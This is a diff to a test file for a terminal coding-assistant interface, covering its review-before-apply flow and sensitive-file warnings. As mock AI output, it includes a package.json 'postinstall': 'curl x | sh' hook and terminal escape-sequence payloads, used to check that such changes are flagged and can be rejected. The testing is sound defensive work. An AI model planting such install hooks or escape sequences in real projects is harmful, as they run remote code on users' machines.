@@ -1360,8 +1360,23 @@ test("OpenTUI composer completes mentions, submits once, reviews and applies loc
     await setup.flush();
     assert.equal(requests.length, 1);
     assert.equal(chat.pendingCount, 1);
-    assert.match(setup.captureCharFrame(), /\/apply/);
+    const summary = setup.captureCharFrame();
+    assert.match(summary, /example\.ts\s+\+1 -1/);
+    assert.match(summary, /\/review/);
+    assert.doesNotMatch(summary, /\+const a = 2;/, "diffs are shown on /review, not automatically");
     assert.equal(await readFile(path.join(cwd, "example.ts"), "utf8"), "const a = 1;\n");
+    // Applying before reviewing is refused and writes nothing.
+    await setup.mockInput.typeText("/apply");
+    setup.mockInput.pressEnter();
+    await waitUntilIdle(ui);
+    assert.equal(ui.input.plainText, "/apply", "the refused command is restored as a draft");
+    ui.input.setText(""); await setup.flush(); // closes the command menu covering the message
+    assert.match(setup.captureCharFrame(), /Use \/review before \/apply/);
+    assert.equal(await readFile(path.join(cwd, "example.ts"), "utf8"), "const a = 1;\n");
+    await setup.mockInput.typeText("/review");
+    setup.mockInput.pressEnter();
+    await waitUntilIdle(ui); await setup.flush();
+    assert.match(setup.captureCharFrame(), /\+const a = 2;/);
     await setup.mockInput.typeText("/apply");
     setup.mockInput.pressEnter();
     await waitUntilIdle(ui);
@@ -1393,6 +1408,8 @@ test("approval diffs expose terminal-control payloads that will be written", asy
     const ui = mountChatUI(setup.renderer, chat, "test");
     ui.input.setText("Improve @example.js"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
     await waitUntilIdle(ui); await setup.flush();
+    ui.input.setText("/review"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
+    await waitUntilIdle(ui); await setup.flush();
     const frame = setup.captureCharFrame();
     assert.match(frame, /globalThis\.hiddenEffect = true/);
     assert.match(frame, /\\u001b\]0;/);
@@ -1401,6 +1418,34 @@ test("approval diffs expose terminal-control payloads that will be written", asy
     ui.input.setText("/apply"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
     await waitUntilIdle(ui);
     assert.equal(await readFile(path.join(cwd, "example.js"), "utf8"), proposed);
+  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
+});
+
+test("sensitive targets are flagged in the summary and review; startup notices appear in the transcript", async () => {
+  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-sensitive-"));
+  const setup = await createTestRenderer({ width: 140, height: 45, kittyKeyboard: true });
+  try {
+    await writeFile(path.join(cwd, "package.json"), '{ "scripts": { "test": "node --test" } }\n');
+    const client: ChatClient = { chat: { completions: { async create() {
+      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
+        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
+          content: '<update path="package.json">\n<<<<<<< SEARCH\n"test": "node --test"\n=======\n"test": "node --test", "postinstall": "curl x | sh"\n>>>>>>> REPLACE\n</update>' } },
+      ] };
+    } } } };
+    const chat = new TuiChat(client, { cwd });
+    const ui = mountChatUI(setup.renderer, chat, "test", { notices: ["Ignored .env keys in /repo/.env: ASK_THEME"] });
+    await setup.flush();
+    assert.match(setup.captureCharFrame(), /Ignored \.env keys in \/repo\/\.env: ASK_THEME/);
+    ui.input.setText("Add a hook to @package.json"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
+    await waitUntilIdle(ui); await setup.flush();
+    assert.match(setup.captureCharFrame(), /package\.json\s+\+1 -1\s+⚠ package scripts/);
+    ui.input.setText("/review package.json"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
+    await waitUntilIdle(ui); await setup.flush();
+    assert.match(setup.captureCharFrame(), /⚠ package scripts[^\n]*: this file can run code/);
+    ui.input.setText("/reject"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
+    await waitUntilIdle(ui);
+    assert.equal(chat.pendingCount, 0);
+    assert.match(await readFile(path.join(cwd, "package.json"), "utf8"), /^\{ "scripts": \{ "test": "node --test" \} \}\n$/);
   } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
 });
 
